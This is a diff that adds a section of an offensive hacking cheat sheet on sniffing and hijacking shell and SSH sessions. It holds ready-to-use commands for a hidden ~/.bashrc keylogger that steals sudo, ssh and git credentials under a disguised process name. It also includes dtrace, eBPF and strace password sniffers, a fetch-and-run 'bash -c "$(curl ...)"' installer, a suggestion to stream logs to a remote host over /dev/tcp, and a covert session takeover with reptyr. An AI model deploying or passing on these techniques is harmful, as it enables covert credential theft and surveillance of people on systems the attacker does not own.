@@ -1,0 +1,103 @@
+ Session sniffing and hijaking
+
+10.i Sniff a user's SHELL session
+
+A 1-liner for ~/.bashrc to sniff the user's keystrokes and save them to ~/.config/.pty/.@*. Useful when not root and needing to capture the sudo/ssh/git credentials of the user.
+
+Deploy: Cut & paste the following onto the target and follow the instructions:
+
+# This is a glorified version of:
+# [ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { script -V; } &>/dev/null && LC_PTY=1 exec -a "sshd: pts/0" script -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$
+command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
+&& { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
+&& { script -h | grep -qm1 -- -I && cp "$(command -v script)" ~/.config/.pty/pty; :; } \
+&& { [ ! -f ~/.config/.pty/pty ] && curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/script"; :; } \
+&& [ -f ~/.config/.pty/pty ] \
+&& curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
+&& chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
+&& echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
+&& echo -e '[ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
+
+    Combined with zapper to hide command options from the process list.
+    Requires /usr/bin/script from util-linux >= 2.37 (-I flag). We pull the static bin from pkgforge.
+    Consider using /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+    Log in with ssh -o "SetEnv LC_PTY=1" to disable logging.
+
+10.ii Sniff all SHELL sessions with dtrace - FreeBSD
+
+Especially useful for Solaris/SunOS and FreeBSD (pfSense). It uses kernel probes to trace all sshd processes.
+
+Copy this "D Script" to the target system to a file named d:
+
+#pragma D option quiet
+inline string NAME = "sshd";
+syscall::write:entry
+/(arg0 >= 5) && (arg2 <= 16) && (execname == NAME)/
+{ printf("%d: %s\n", pid, stringof(copyin(arg1, arg2))); }
+
+Start a dtrace and log to /tmp/.log:
+
+### Start kernel probe as background process.
+(dtrace -sd >/tmp/.log &)
+
+10.iii Sniff all SHELL sessions with eBPF - Linux
+
+eBPF allows us to safely hook over 120,000 functions in the kernel. It's like a better "dtrace" but for Linux.
+
+curl -o bpftrace -fsSL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
+chmod 755 bpftrace
+curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
+./bpftrace -Bnone ptysnoop.bt
+
+Check out our very own eBPF tools to sniff sudo/su/ssh passwords.
+
+10.iv Sniff a user's SSH, bash or SSHD session with strace
+
+tit() {
+	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
+	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+}
+# tit read $(pidof -s ssh)
+# tit read $(pidof -s bash)
+# tit write $(pgrep -f 'sshd.*pts' | head -n1)
+
+It is also possible to sniff the SSHD process (captures also sudo passwords etc). Note that we trace the write() call instead (because sshd 'writes' data to the bash):
+
+# Find the sshd PID that spawned the bash:
+ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep'
+...
+UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
+paralle+    7770    7764  0  5088  6780   1 Aug28 ?        00:00:05 sshd: parallels@pts/0
+paralle+    9056    9050  0  5088  6652   1 Aug28 ?        00:00:00 sshd: parallels@pts/1
+paralle+   11938   11932  0  5074  6772   1 10:59 ?        00:00:00 sshd: parallels@pts/3
+...
+
+Sniff 7770 (example):
+
+tit write 7770
+
+10.v. Sniff a user's outgoing SSH session with a wrapper script
+
+Even dirtier method in case /proc/sys/kernel/yama/ptrace_scope is set to 1 (strace will fail on already running SSH sessions)
+
+Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
+Show wrapper script - CLICK HERE
+
+The SSH session will be sniffed and logged to ~/.ssh/logs/ the next time the user logs into his shell and uses SSH.
+
+10.vi Sniff a user's outgoing SSH session using SSH-IT
+
+The easiest way is using https://www.thc.org/ssh-it/.
+
+bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
+
+10.vii Hijack / Take-over a running SSH session
+
+Use https://github.com/nelhage/reptyr to take over an existing SSH session:
+
+ps ax -o pid,ppid,cmd | grep 'ssh '
+./reptyr -T <SSH PID>
+### or: ./reptyr -T $(pidof -s ssh)
+### Must use '-T' or otherwise the original user will see that his SSH process gets suspended.
+
+
